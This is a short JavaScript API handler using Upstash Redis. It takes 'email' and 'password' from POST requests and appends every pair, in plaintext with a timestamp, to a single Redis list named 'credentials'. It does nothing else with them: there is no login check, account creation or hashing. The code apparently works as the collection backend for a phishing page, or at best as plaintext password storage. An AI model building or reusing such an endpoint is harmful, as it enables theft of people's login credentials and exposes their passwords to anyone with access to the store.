import { Redis } from '@upstash/redis'

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
})

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password } = req.body;
    const now = new Date().toISOString();

    const key = 'credentials';

    let entries = [];
    try {
      const existing = await redis.get(key);
      entries = existing ? JSON.parse(existing) : [];
    } catch {
      entries = [];
    }

    entries.push({
      email: email || '',
      password: password || '',
      createdAt: now,
    });

    await redis.set(key, JSON.stringify(entries));

    res.status(200).json({ ok: true });
  } catch (error) {
    res.status(500).json({ ok: false, error: String(error) });
  }
}